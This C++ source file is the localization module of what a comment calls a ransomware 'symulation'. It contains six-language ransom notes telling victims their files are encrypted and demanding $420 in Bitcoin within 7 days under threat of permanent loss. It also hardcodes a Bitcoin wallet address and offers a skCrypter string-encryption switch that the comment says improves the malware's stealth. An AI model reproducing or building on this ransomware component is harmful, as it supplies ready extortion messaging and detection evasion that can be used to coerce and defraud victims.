#include "localization.hpp"
#include <stdexcept>
#include <tchar.h>

// Not needed for symulation, but will greatly improve stealthness of the malware
#define DISABLE_STR_ENCRYPTION

#ifdef DISABLE_STR_ENCRYPTION
    #define _(str) str
#else
    #include "..\skCrypter\files\skCrypter.h"
#define _ skCrypt
#endif

const wchar_t* TEXTS[]
{
    //English
    _(L"Ooops, your files have been encrypted!"),
    _(L"What Happened to My Computer?"),
    _(L"Can I Recover My Files?"),
    _(L"How Do I Pay?"),
    _(L"Your important files are encrypted. Many of your documents, photos, videos, databases and other files are no longer accessible because they have been encrypted. Maybe you are busy looking for a way to recover your files, but do not waste your time. Nobody can recover your files without our decryption service."),
    _(L"Sure. We guarantee that you can recover all your files safely and easily. But you have not so enough time. You can decrypt some of your files for free. Try now by clicking <Decrypt>. But if you want to decrypt all your files, you need to pay. You only have 7 days to submit the payment. After that your files will be lost forever!"),
    _(L"Payment is accepted in Bitcoin only. For more information, click <What is Bitcoin?>. Please check the current price of Bitcoin and buy some bitcoins. For more information, click <How to buy bitcoins?> and send the correct amount to the address specified in this window. After your payment, click <Check Payment> button. We will check your payment and perform decryption."),
    _(L"Send $420 worth of Bitcoin to this address:"),
    _(L"Your files"),
    _(L"will be lost in:"),
    _(L"Forever!"),
    _(L"Decrypt"),
    _(L"Check Payment"),
    _(L"Copy"),
    _(L"What is Bitcoin?"),
    _(L"How to buy bitcoins?"),

    //Polish
    _(L"O niee, twoje pliki zostały zaszyfrowane!"),
    _(L"Co się stało z moim komputerem?"),
    _(L"Czy mogę odzyskać moje pliki?"),
    _(L"Jak dokonać płatności?"),
    _(L"Twoje ważne pliki zostały zaszyfrowane. Wiele twoich dokumentów, zdjęć, filmów, baz danych i innych plików nie jest już dostępnych, ponieważ zostały zaszyfrowane. Może szukasz sposobu na odzyskanie swoich plików, ale nie marnuj czasu. Nikt nie może odzyskać twoich plików bez naszej usługi dekryptacji."),
    _(L"Oczywiście. Gwarantujemy, że możesz bezpiecznie i łatwo odzyskać wszystkie swoje pliki. Ale nie masz zbyt wiele czasu. Możesz odszyfrować niektóre ze swoich plików za darmo. Wypróbuj teraz, klikając <Odszyfruj>. Ale jeśli chcesz odszyfrować wszystkie swoje pliki, musisz zapłacić. Masz tylko 7 dni na dokonanie płatności. Po tym czasie twoje pliki zostaną utracone na zawsze!"),
    _(L"Płatność jest akceptowana tylko w Bitcoinach. Aby uzyskać więcej informacji, kliknij <Co to jest Bitcoin?>. Sprawdź aktualną cenę Bitcoina i kup trochę bitcoinów. Aby uzyskać więcej informacji, kliknij <Jak kupić bitcoiny?> i prześlij odpowiednią kwotę na adres podany w tym oknie. Po dokonaniu płatności kliknij przycisk <Sprawdź płatność>. Sprawdzimy twoją płatność i przeprowadzimy dekryptację."),
    _(L"Wyślij bitcoiny o wartości 420 dolarów na ten adres:"),
    _(L"Twoje pliki"),
    _(L"zostaną utracone za:"),
    _(L"Na zawsze!"),
    _(L"Odszyfruj"),
    _(L"Sprawdź płatność"),
    _(L"Kopiuj"),
    _(L"Co to jest Bitcoin?"),
    _(L"Jak kupić bitcoiny?"),

    //Spanish
    _(L"¡Vaya, tus archivos han sido encriptados!"),
    _(L"¿Qué le pasó a mi computadora?"),
    _(L"¿Puedo recuperar mis archivos?"),
    _(L"¿Cómo pago?"),
    _(L"Tus archivos importantes están encriptados. Muchos de tus documentos, fotos, videos, bases de datos y otros archivos ya no están disponibles porque han sido encriptados. Tal vez estás buscando una manera de recuperar tus archivos, pero no pierdas el tiempo. Nadie puede recuperar tus archivos sin nuestro servicio de descifrado."),
    _(L"Por supuesto.Garantizamos que puedes recuperar todos tus archivos de manera segura y fácil.Pero no tienes tanto tiempo.Puedes desencriptar algunos de tus archivos gratis.Prueba ahora haciendo clic en <Desencriptar>.Pero si quieres desencriptar todos tus archivos, necesitas pagar.Solo tienes 7 días para realizar el pago.¡Después de eso, tus archivos se perderán para siempre!"),
    _(L"El pago se acepta solo en Bitcoin. Para más información, haz clic en <¿Qué es Bitcoin?>. Por favor, revisa el precio actual de Bitcoin y compra algunos bitcoins. Para más información, haz clic en <¿Cómo comprar bitcoins?> y envía la cantidad correcta a la dirección especificada en esta ventana. Después de tu pago, haz clic en el botón <Verificar Pago>. Revisaremos tu pago y realizaremos el descifrado."),
    _(L"Envía $420 en Bitcoin a esta dirección:"),
    _(L"Tus archivos"),
    _(L"se perderán en:"),
    _(L"¡Para siempre!"),
    _(L"Desencriptar"),
    _(L"Verificar Pago"),
    _(L"Copiar"),
    _(L"¿Qué es Bitcoin?"),
    _(L"¿Cómo comprar bitcoins?"),

    //French
    _(L"Oups, vos fichiers ont été cryptés!"),
    _(L"Qu'est-il arrivé à mon ordinateur?"),
    _(L"Puis-je récupérer mes fichiers?"),
    _(L"Comment puis-je payer?"),
    _(L"Vos fichiers importants sont cryptés. Beaucoup de vos documents, photos, vidéos, bases de données et autres fichiers ne sont plus accessibles car ils ont été cryptés. Peut-être que vous cherchez un moyen de récupérer vos fichiers, mais ne perdez pas votre temps. Personne ne peut récupérer vos fichiers sans notre service de décryptage."),
    _(L"Bien sûr. Nous garantissons que vous pouvez récupérer tous vos fichiers en toute sécurité et facilement. Mais vous n'avez pas beaucoup de temps. Vous pouvez décrypter certains de vos fichiers gratuitement. Essayez maintenant en cliquant sur <Décrypter>. Mais si vous voulez décrypter tous vos fichiers, vous devez payer. Vous n'avez que 7 jours pour effectuer le paiement. Après cela, vos fichiers seront perdus pour toujours!"),
    _(L"Le paiement est accepté uniquement en Bitcoin. Pour plus d'informations, cliquez sur <Qu'est-ce que Bitcoin?>. Veuillez vérifier le prix actuel du Bitcoin et acheter des bitcoins. Pour plus d'informations, cliquez sur <Comment acheter des bitcoins?> et envoyez le montant correct à l'adresse spécifiée dans cette fenêtre. Après votre paiement, cliquez sur le bouton <Vérifier le paiement>. Nous vérifierons votre paiement et procéderons au décryptage."),
    _(L"Envoyez pour 420 $ de Bitcoin à cette adresse:"),
    _(L"Vos fichiers"),
    _(L"seront perdus dans:"),
    _(L"Pour toujours!"),
    _(L"Décrypter"),
    _(L"Vérifier le paiement"),
    _(L"Copier"),
    _(L"Qu'est-ce que Bitcoin?"),
    _(L"Comment acheter des bitcoins?"),

    //German
    _(L"Ooops, Ihre Dateien wurden verschlüsselt!"),
    _(L"Was ist mit meinem Computer passiert?"),
    _(L"Kann ich meine Dateien wiederherstellen?"),
    _(L"Wie bezahle ich?"),
    _(L"Ihre wichtigen Dateien sind verschlüsselt. Viele Ihrer Dokumente, Fotos, Videos, Datenbanken und andere Dateien sind nicht mehr zugänglich, weil sie verschlüsselt wurden. Vielleicht suchen Sie gerade nach einer Möglichkeit, Ihre Dateien wiederherzustellen, aber verschwenden Sie keine Zeit. Niemand kann Ihre Dateien ohne unseren Entschlüsselungsdienst wiederherstellen."),
    _(L"Sicher. Wir garantieren, dass Sie alle Ihre Dateien sicher und einfach wiederherstellen können. Aber Sie haben nicht viel Zeit. Sie können einige Ihrer Dateien kostenlos entschlüsseln. Versuchen Sie es jetzt, indem Sie auf <Entschlüsseln> klicken. Aber wenn Sie alle Ihre Dateien entschlüsseln möchten, müssen Sie bezahlen. Sie haben nur 7 Tage Zeit, um die Zahlung zu leisten. Danach werden Ihre Dateien für immer verloren sein!"),
    _(L"Zahlung wird nur in Bitcoin akzeptiert. Für weitere Informationen klicken Sie auf <Was ist Bitcoin?>. Bitte überprüfen Sie den aktuellen Preis von Bitcoin und kaufen Sie einige Bitcoins. Für mehr Informationen klicken Sie auf <Wie kaufe ich Bitcoins?> und senden Sie den korrekten Betrag an die in diesem Fenster angegebene Adresse. Nach Ihrer Zahlung klicken Sie auf den Button <Zahlung überprüfen>. Wir werden Ihre Zahlung überprüfen und die Entschlüsselung durchführen."),
    _(L"Senden Sie Bitcoins im Wert von $420 an diese Adresse:"),
    _(L"Ihre Dateien"),
    _(L"werden verloren gehen in:"),
    _(L"Für immer!"),
    _(L"Entschlüsseln"),
    _(L"Zahlung überprüfen"),
    _(L"Kopieren"),
    _(L"Was ist Bitcoin?"),
    _(L"Wie kaufe ich Bitcoins?"),

    //Russian
    _(L"Упс, ваши файлы были зашифрованы!"),
    _(L"Что случилось с моим компьютером?"),
    _(L"Могу ли я восстановить свои файлы?"),
    _(L"Как мне заплатить?"),
    _(L"Ваши важные файлы зашифрованы. Многие из ваших документов, фотографий, видео, баз данных и других файлов больше недоступны, потому что они были зашифрованы. Возможно, вы сейчас ищете способ восстановить ваши файлы, но не теряйте времени. Никто не может восстановить ваши файлы без нашего сервиса дешифровки."),
    _(L"Конечно. Мы гарантируем, что вы сможете безопасно и легко восстановить все свои файлы. Но у вас нет так много времени. Вы можете бесплатно расшифровать некоторые из ваших файлов. Попробуйте сейчас, нажав <Расшифровать>. Но если вы хотите расшифровать все свои файлы, вам нужно заплатить. У вас есть только 7 дней на осуществление платежа. После этого ваши файлы будут потеряны навсегда!"),
    _(L"Оплата принимается только в биткойнах. Для получения дополнительной информации нажмите <Что такое Биткойн?>. Пожалуйста, проверьте текущую цену биткойна и купите некоторое количество биткойнов. Для получения дополнительной информации нажмите <Как купить биткойны?> и отправьте правильную сумму на указанный в этом окне адрес. После вашей оплаты нажмите кнопку <Проверить платеж>. Мы проверим ваш платеж и выполним дешифровку."),
    _(L"Отправьте биткойнов на сумму $420 на этот адрес:"),
    _(L"Ваши файлы"),
    _(L"будут потеряны через:"),
    _(L"Навсегда!"),
    _(L"Расшифровать"),
    _(L"Проверить платеж"),
    _(L"Копировать"),
    _(L"Что такое Биткойн?"),
    _(L"Как купить биткойны?"),
};

#define LANGUAGE_TEXT_CHUNK ((sizeof(TEXTS) / sizeof(uintptr_t)) / (int(Localization::Language::COUNT) - 1))

Localization::Localization() : m_language(Localization::Language::ENGLISH)
{
}

Localization::~Localization()
{
}

bool Localization::setLanguage(const Language& lang)
{
    if (lang == m_language or lang >= Language::COUNT)
        return false;

    m_language = lang;
    return true;
}

std::wstring Localization::getTextStr(const Text& text)
{
    return getText(text);
}

const wchar_t* Localization::getText(const Text& text)
{
    static auto TEXT_LINK1 = _(L"https://en.wikipedia.org/wiki/Bitcoin");
    static auto TEXT_LINK2 = _(L"https://www.forbes.com/advisor/investing/cryptocurrency/how-to-buy-bitcoin/");
    static auto TEXT_BTCWALLET = _(L"1JHcdV9fjJjwQj5jXyZ2j5xvJLZ9F2Xz9r");

    if (text >= Text::COUNT or text < Text(0))
        throw std::runtime_error("Invalid text");

    switch (text)
    {
        case Text::BTC_WALLET: return TEXT_BTCWALLET; break;
        case Text::LINK_1: return TEXT_LINK1; break;
        case Text::LINK_2: return TEXT_LINK2; break;
    }

    auto str = TEXTS[((static_cast<int>(m_language) - 1) * LANGUAGE_TEXT_CHUNK) + static_cast<int>(text)];

    return str;
}
